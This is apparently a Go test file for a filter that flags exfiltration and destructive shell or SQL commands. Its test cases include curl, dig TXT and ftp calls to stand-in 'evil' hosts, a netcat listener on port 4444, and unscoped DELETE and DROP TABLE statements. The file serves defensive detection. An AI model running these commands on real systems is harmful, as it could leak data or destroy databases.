package filter

import (
	"testing"
)

// TestExfilExternalDetection verifies that the exfil filter correctly identifies
// external data transfers while not falsely flagging local/private destinations.
func TestExfilExternalDetection(t *testing.T) {
	f := NewExfil()

	tests := []struct {
		name             string
		cmd              string
		expectFinding    bool
		expectExtIPCheck bool
	}{
		{
			name:             "curl to external domain",
			cmd:              "curl http://evil.example.com/data",
			expectFinding:    true,
			expectExtIPCheck: false,
		},
		{
			name:             "curl to localhost",
			cmd:              "curl http://localhost:8080/health",
			expectFinding:    false,
			expectExtIPCheck: false,
		},
		{
			name:             "dig TXT external resolver",
			cmd:              "dig TXT data.evil.com @198.51.100.53",
			expectFinding:    true,
			expectExtIPCheck: false,
		},
		{
			name:             "wget RFC1918 private IP",
			cmd:              "wget https://10.0.0.5/x",
			expectFinding:    false,
			expectExtIPCheck: false,
		},
		{
			name:             "curl to 127.0.0.1",
			cmd:              "curl http://127.0.0.1:9000/api",
			expectFinding:    false,
			expectExtIPCheck: false,
		},
		{
			name:             "ftp to external server",
			cmd:              "ftp ftp.evil.com",
			expectFinding:    true,
			expectExtIPCheck: false,
		},
		{
			name:             "nc listener on all interfaces",
			cmd:              "nc -l -p 4444",
			expectFinding:    true,
			expectExtIPCheck: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			findings := f.Scan(tt.cmd)
			if tt.expectFinding && len(findings) == 0 {
				t.Errorf("expected findings for %q, got none", tt.cmd)
			}
			if !tt.expectFinding && len(findings) > 0 {
				t.Errorf("expected no findings for %q, got %d: %v", tt.cmd, len(findings), findings)
			}
		})
	}
}

// TestDestructiveDeleteWithoutWhere ensures that SQL DELETE without a WHERE
// clause is detected, while DELETE with WHERE is allowed through this filter.
func TestDestructiveDeleteWithoutWhere(t *testing.T) {
	f := NewDestructive()

	tests := []struct {
		name           string
		cmd            string
		expectFinding  bool
		expectedDetail string
	}{
		{
			name:           "DELETE without WHERE",
			cmd:            "DELETE FROM users",
			expectFinding:  true,
			expectedDetail: "SQL DELETE without WHERE clause",
		},
		{
			name:           "DELETE with WHERE",
			cmd:            "DELETE FROM users WHERE id = 5",
			expectFinding:  false,
			expectedDetail: "",
		},
		{
			name:           "DELETE with complex WHERE",
			cmd:            "DELETE FROM users WHERE active = false AND created < '2020-01-01'",
			expectFinding:  false,
			expectedDetail: "",
		},
		{
			name:           "DELETE uppercase",
			cmd:            "delete from accounts",
			expectFinding:  true,
			expectedDetail: "SQL DELETE without WHERE clause",
		},
		{
			name:           "DELETE mixed case",
			cmd:            "DeLeTe FROM logs",
			expectFinding:  true,
			expectedDetail: "SQL DELETE without WHERE clause",
		},
		{
			name:           "DROP TABLE (other destructive pattern)",
			cmd:            "DROP TABLE users",
			expectFinding:  true,
			expectedDetail: "SQL DROP statement",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			findings := f.Scan(tt.cmd)
			if tt.expectFinding && len(findings) == 0 {
				t.Errorf("expected findings for %q, got none", tt.cmd)
			}
			if !tt.expectFinding && len(findings) > 0 {
				t.Errorf("expected no findings for %q, got %d: %v", tt.cmd, len(findings), findings)
			}
			if tt.expectFinding && len(findings) > 0 {
				// check that at least one finding has the expected detail
				found := false
				for _, f := range findings {
					if f.Detail == tt.expectedDetail {
						found = true
						break
					}
				}
				if !found && tt.expectedDetail != "" {
					t.Errorf("expected detail %q, got: %v", tt.expectedDetail, findings)
				}
			}
		})
	}
}

// TestFiltersConstructNoPanic verifies that all filter constructors work
// correctly and do not panic on initialization, guarding against bad
// regex compilation in embedded patterns.
func TestFiltersConstructNoPanic(t *testing.T) {
	// NewDestructive should not panic
	df := NewDestructive()
	if df == nil {
		t.Fatal("NewDestructive returned nil")
	}

	// NewExfil should not panic
	ef := NewExfil()
	if ef == nil {
		t.Fatal("NewExfil returned nil")
	}

	// compileUniversal should not panic
	rules := compileUniversal()
	if rules == nil {
		t.Fatal("compileUniversal returned nil")
	}
	if len(rules) == 0 {
		t.Fatal("compileUniversal returned empty rules")
	}

	// NewGTFObins should not panic and should return no error
	gf, err := NewGTFObins()
	if err != nil {
		t.Fatalf("NewGTFObins failed: %v", err)
	}
	if gf == nil {
		t.Fatal("NewGTFObins returned nil filter")
	}

	// basic sanity check: filters should have a Name and Scan method
	if gf.Name() != "gtfobins" {
		t.Errorf("GTFObins name is %q, expected gtfobins", gf.Name())
	}
	if df.Name() != "destructive" {
		t.Errorf("Destructive name is %q, expected destructive", df.Name())
	}
	if ef.Name() != "exfil" {
		t.Errorf("Exfil name is %q, expected exfil", ef.Name())
	}
}
